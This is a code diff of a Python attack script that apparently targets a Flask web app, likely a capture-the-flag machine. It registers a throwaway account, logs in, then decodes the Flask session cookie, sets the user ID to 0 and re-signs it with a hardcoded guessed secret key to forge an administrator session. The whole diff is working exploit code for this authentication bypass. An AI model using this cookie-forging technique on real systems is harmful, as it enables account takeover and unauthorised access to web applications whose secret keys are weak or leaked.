@@ -3,16 +3,16 @@
 from random_username.generate import generate_username
 from fake_useragent import UserAgent
 from requests import Session
-from flask import Flask
-from flask_login import login_user
+from flask_unsign import session as flask_session
 from string import ascii_letters, digits
 from random import choices
 from bs4 import BeautifulSoup
-from sys import argv
+from sys import argv, settrace
 
 USERNAME = generate_username(1)[0]
 PASSWORD = ''.join(choices(ascii_letters + digits, k=8))
 USER_AGENT = UserAgent().random
+SECRET_KEY = 'y0u-w1ll-n3v3r-gu355'
 
 
 def retrieve_csrf_token(s: Session, url: str) -> str:
@@ -56,15 +56,22 @@ def retrieve_users(s: Session, url: str) -> list:
 def main() -> None:
     try:
         url = f'http://{argv[1]}:5000'
-        app = Flask(__name__)
         s = Session()
         s.headers['User-Agent'] = USER_AGENT
         register(s, url)
         login(s, url)
         users = retrieve_users(s, url)
+        current_session = flask_session.decode(value=s.cookies['session'])
+        current_session['_user_id'] = '0'
+        current_session = flask_session.sign(
+            value=current_session,
+            secret=SECRET_KEY,
+            salt='cookie-session',
+            legacy=False
+        )
+        print(current_session)
     except:
         print('[-] Something went wrong')
-    login_user(users[0])
 
 
 if __name__ == '__main__':
